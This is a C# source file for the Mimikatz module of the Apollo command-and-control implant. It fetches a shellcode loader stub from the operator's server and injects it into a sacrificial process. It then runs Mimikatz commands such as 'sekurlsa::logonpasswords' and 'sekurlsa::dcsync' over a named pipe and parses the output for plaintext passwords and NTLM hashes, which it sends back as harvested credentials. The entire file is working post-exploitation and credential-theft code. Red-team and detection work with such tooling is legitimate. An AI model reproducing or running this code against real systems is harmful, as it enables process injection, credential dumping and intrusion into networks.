#define COMMAND_NAME_UPPER

#if DEBUG
#undef MIMIKATZ
#define MIMIKATZ
#endif

#if MIMIKATZ

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;
using Apollo.Jobs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Diagnostics;
using System.IO;
using IPC;
using Apollo.Tasks;
using Apollo.Evasion;

namespace Apollo.CommandModules
{
    class Mimikatz
    {
        private static byte[] loaderStub;
        private static string[] CredentialCommands = new string[] { "sekurlsa::logonpasswords", "sekurlsa::dcsync" };


        /// <summary>
        /// Execute an arbitrary C# assembly in a sacrificial process
        /// that respects the current caller's token.
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. job.Task.parameters
        /// should contain a JSON structure with key "assembly" that
        /// has an associated Apfell file ID to pull from the server.
        /// This assembly is position-independent code generated from
        /// donut with arguments baked in.
        /// </param>
        /// <param name="agent">Agent this task is run on.</param>
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            string sacrificialApplication;
            string commandLine = "";
            string command = "";
            string loaderStubID;
            string pipeName;
            JObject json;
            List<string> output = new List<string>();

            /*
             * Response from the server should be of the form:
             * {
             * "loader_stub_id": "File ID of the loader stub",
             * "pipe_name": "named pipe to connect to",
             * "command": "command line arguments to send",
             * }
             */
            //ProcessWithAnonymousPipeIO sacrificialProcess = null;
            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
            try
            {
                json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            } catch (Exception ex)
            {
                job.SetError($"Error deserializing task parameters. Malformed JSON. System exception: {ex.Message}\n\nTask Parameters:\n{task.parameters}");
                return;
            }

            command = json.Value<string>("command");
            if (string.IsNullOrEmpty(command))
            {
                job.SetError("Require one or more commands to give to Mimikatz.");
                return;
            }

            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            try
            {
                loaderStub = implant.Profile.GetFile(task.id, loaderStubID, implant.Profile.ChunkSize);
            } catch (Exception ex)
            {
                job.SetError($"Failed to fetch loader stub for Mimikatz. Reason: {ex.Message}.\nParameters:\n{task.parameters}");
                return;
            }
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve DLL shellcode stub with ID {0}", loaderStubID));
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (string.IsNullOrEmpty(pipeName))
            {
                job.SetError("No pipe name was given to DLL to start the named pipe server.");
                return;
            }

            if (implant.architecture == "x64")
                sacrificialApplication = EvasionManager.SpawnTo64;
            else
                sacrificialApplication = EvasionManager.SpawnTo86;

            try
            {
                
                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(sacrificialApplication, commandLine, true);

                if (sacrificialProcess.Start())
                {
                    string status = "";
                    if (!string.IsNullOrEmpty(commandLine))
                        status = $"Sacrificial process spawned '{sacrificialApplication} {commandLine}' (PID: {sacrificialProcess.PID})\n";
                    else
                        status = $"Sacrificial process spawned {sacrificialApplication} (PID: {sacrificialProcess.PID})\n";

                    job.AddOutput(status);
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;
                    ApolloTaskResponse response; 
                    if (sacrificialProcess.Inject(loaderStub))
                    {
                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                        pipeClient.Connect(30000);

                        StreamWriter writer;
                        try
                        {
                            writer = new StreamWriter(pipeClient);
                            writer.Write(command);
                            writer.Flush();
                            using (StreamReader sr = new StreamReader(pipeClient))
                            {
                                var line = sr.ReadLine();
                                while (line != null && line.ToUpper().Trim() != "EOF")
                                {
                                    output.Add(line);
                                    line = sr.ReadLine();
                                }
                            }
                            if (pipeClient.IsConnected)
                                writer.Close();

                            if (output.Count > 0)
                            {
                                response = new ApolloTaskResponse(job.Task, output.ToArray());
                                var credResp = GetCredentialResponse(job.Task, command, output);
                                job.AddOutput(response);
                                if (credResp.credentials != null && credResp.credentials.Length > 0)
                                    job.AddOutput(credResp);
                                output.Clear();
                            }
                            job.SetComplete("");
                        }
                        catch (Exception ex)
                        {
                            job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
                        }
                    } else
                    {
                        job.SetError($"Failed to inject loader stub: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                    }
                } else
                {
                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in Mimikatz (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
                }
                else
                {
                    job.SetError(String.Format("Error in Mimikatz. Reason: {0}", ex.Message));
                }
            }
            finally
            {
                if (!sacrificialProcess.HasExited)
                    sacrificialProcess.Kill();
            }
        }

        private static string GetValue(string line)
        {
            string result = "";
            line = line.Trim();
            char[] separator = new char[] { ':' };
            string[] parts = line.Split(separator, 2);
            if (parts.Length == 2)
                result = parts[1].Trim();
            if (result == "(null)")
                result = "";
            return result;
        }

        private static ApolloTaskResponse GetCredentialResponse(Task task, string command, List<string> output)
        {
            bool bRet = false;
            List<Mythic.Structs.MythicCredential> creds = new List<Mythic.Structs.MythicCredential>();
            Mythic.Structs.MythicCredential cred = new Mythic.Structs.MythicCredential();
            ApolloTaskResponse resp = new ApolloTaskResponse(task);

            foreach (string cmd in CredentialCommands)
            {
                if (command.Contains(cmd))
                {
                    bRet = true;
                }
            }
            if (!bRet)
                return resp;

            string[] outputArray = output.ToArray();
            for(int i = 0; i < outputArray.Length; i++)
            {
                string line = outputArray[i].Trim();
                if (line.ToLower().Contains("username"))
                {
                    if (cred.credential != null && cred.account != null && cred.credential != "" && cred.account != null)
                    {
                        creds.Add(cred);
                    }
                    cred = new Mythic.Structs.MythicCredential(true);
                    string val = GetValue(line);
                    cred.account = val;
                }
                if (line.ToLower().Contains("domain"))
                {
                    if (i+1 < outputArray.Length)
                    {
                        if (outputArray[i+1].ToLower().Contains("password") || 
                            outputArray[i+1].ToLower().Contains("ntlm"))
                        {
                            cred.realm = GetValue(line);
                        }
                    }
                }
                if (line.ToLower().Contains("password") || line.ToLower().Contains("ntlm"))
                {
                    if (line.ToLower().Contains("password"))
                    {
                        cred.credential_type = "plaintext";
                    }
                    else if (line.ToLower().Contains("ntlm"))
                    {
                        cred.credential_type = "hash";
                    } else
                    {
                        cred.credential_type = "";
                    }
                    cred.credential = GetValue(line);
                }
            }

            if (creds.Count == 0)
                return resp;

            resp.credentials = creds.ToArray();
            return resp;
        }
    }
}
#endif